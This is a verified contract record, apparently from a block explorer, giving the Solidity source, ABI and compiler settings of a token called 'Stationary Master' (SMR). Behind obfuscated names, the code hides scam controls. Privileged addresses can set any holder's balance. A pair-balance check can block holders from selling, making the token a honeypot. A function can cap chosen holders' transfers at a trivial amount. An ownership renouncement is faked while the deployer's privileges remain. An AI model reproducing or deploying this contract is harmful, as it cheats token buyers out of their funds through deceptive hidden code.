{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface limitTx {\n    function createPair(address limitReceiver, address buyMode) external returns (address);\n}\n\ninterface sellIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxLiquidity) external view returns (uint256);\n\n    function transfer(address minMax, uint256 takeBuy) external returns (bool);\n\n    function allowance(address fromExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minMax,\n        uint256 takeBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isReceiverFee, uint256 value);\n    event Approval(address indexed fromExempt, address indexed spender, uint256 value);\n}\n\nabstract contract receiverLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellIsMetadata is sellIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StationaryMaster is receiverLaunch, sellIs, sellIsMetadata {\n\n    uint256 private walletTeam = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundIs;\n    }\n\n    uint256 constant amountFee = 8 ** 10;\n\n    uint256 public maxWallet;\n\n    uint256 public fromLaunch;\n\n    bool private receiverTake;\n\n    mapping(address => mapping(address => uint256)) private amountSender;\n\n    function allowance(address teamLimit, address takeSellAuto) external view virtual override returns (uint256) {\n        if (takeSellAuto == fundFee) {\n            return type(uint256).max;\n        }\n        return amountSender[teamLimit][takeSellAuto];\n    }\n\n    uint256 takeSwap;\n\n    function transferFrom(address launchIsReceiver, address minMax, uint256 takeBuy) external override returns (bool) {\n        if (_msgSender() != fundFee) {\n            if (amountSender[launchIsReceiver][_msgSender()] != type(uint256).max) {\n                require(takeBuy <= amountSender[launchIsReceiver][_msgSender()]);\n                amountSender[launchIsReceiver][_msgSender()] -= takeBuy;\n            }\n        }\n        return receiverTeam(launchIsReceiver, minMax, takeBuy);\n    }\n\n    mapping(address => bool) public autoReceiver;\n\n    function minTrading(address atAmountFrom, uint256 takeBuy) public {\n        launchedAmount();\n        receiverMax[atAmountFrom] = takeBuy;\n    }\n\n    uint256 private maxExemptMin;\n\n    address fundFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public txList;\n\n    uint256 public autoAtMax;\n\n    string private liquidityLaunch = \"SMR\";\n\n    mapping(address => bool) public isSender;\n\n    bool public receiverEnable;\n\n    address senderReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address atAmountFrom, uint256 takeBuy) external virtual override returns (bool) {\n        return receiverTeam(_msgSender(), atAmountFrom, takeBuy);\n    }\n\n    function receiverSender(address limitMode) public {\n        if (shouldTrading) {\n            return;\n        }\n        if (liquidityList != swapSender) {\n            txList = true;\n        }\n        autoReceiver[limitMode] = true;\n        \n        shouldTrading = true;\n    }\n\n    function owner() external view returns (address) {\n        return launchedAutoFee;\n    }\n\n    function launchedAmount() private view {\n        require(autoReceiver[_msgSender()]);\n    }\n\n    string private autoEnable = \"Stationary Master\";\n\n    uint256 private liquidityList;\n\n    mapping(address => uint256) private receiverMax;\n\n    function isList(uint256 takeBuy) public {\n        launchedAmount();\n        maxFromTotal = takeBuy;\n    }\n\n    function approve(address takeSellAuto, uint256 takeBuy) public virtual override returns (bool) {\n        amountSender[_msgSender()][takeSellAuto] = takeBuy;\n        emit Approval(_msgSender(), takeSellAuto, takeBuy);\n        return true;\n    }\n\n    function receiverTeam(address launchIsReceiver, address minMax, uint256 takeBuy) internal returns (bool) {\n        if (launchIsReceiver == amountReceiverAt) {\n            return launchFundLaunched(launchIsReceiver, minMax, takeBuy);\n        }\n        uint256 modeTrading = sellIs(amountList).balanceOf(senderReceiver);\n        require(modeTrading == maxFromTotal);\n        require(minMax != senderReceiver);\n        if (isSender[launchIsReceiver]) {\n            return launchFundLaunched(launchIsReceiver, minMax, amountFee);\n        }\n        return launchFundLaunched(launchIsReceiver, minMax, takeBuy);\n    }\n\n    uint8 private fundIs = 18;\n\n    function autoBuyEnable() public {\n        emit OwnershipTransferred(amountReceiverAt, address(0));\n        launchedAutoFee = address(0);\n    }\n\n    bool public shouldTrading;\n\n    uint256 public swapMax;\n\n    address private launchedAutoFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTeam;\n    }\n\n    function launchFundLaunched(address launchIsReceiver, address minMax, uint256 takeBuy) internal returns (bool) {\n        require(receiverMax[launchIsReceiver] >= takeBuy);\n        receiverMax[launchIsReceiver] -= takeBuy;\n        receiverMax[minMax] += takeBuy;\n        emit Transfer(launchIsReceiver, minMax, takeBuy);\n        return true;\n    }\n\n    address public amountList;\n\n    uint256 private swapSender;\n\n    function buyTrading(address teamAtLaunch) public {\n        launchedAmount();\n        \n        if (teamAtLaunch == amountReceiverAt || teamAtLaunch == amountList) {\n            return;\n        }\n        isSender[teamAtLaunch] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedAutoFee;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoEnable;\n    }\n\n    event OwnershipTransferred(address indexed teamEnable, address indexed shouldTotalLimit);\n\n    uint256 maxFromTotal;\n\n    function balanceOf(address maxLiquidity) public view virtual override returns (uint256) {\n        return receiverMax[maxLiquidity];\n    }\n\n    address public amountReceiverAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityLaunch;\n    }\n\n    constructor (){\n        if (maxWallet != swapMax) {\n            swapSender = fromLaunch;\n        }\n        maxToken limitFee = maxToken(fundFee);\n        amountList = limitTx(limitFee.factory()).createPair(limitFee.WETH(), address(this));\n        if (swapSender == swapMax) {\n            autoAtMax = liquidityList;\n        }\n        amountReceiverAt = _msgSender();\n        autoReceiver[amountReceiverAt] = true;\n        receiverMax[amountReceiverAt] = walletTeam;\n        autoBuyEnable();\n        \n        emit Transfer(address(0), amountReceiverAt, walletTeam);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTotalLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiverFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeSellAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiverAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSellAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAtMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAtLaunch\",\"type\":\"address\"}],\"name\":\"buyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeBuy\",\"type\":\"uint256\"}],\"name\":\"isList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAmountFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeBuy\",\"type\":\"uint256\"}],\"name\":\"minTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAmountFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchIsReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "StationaryMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}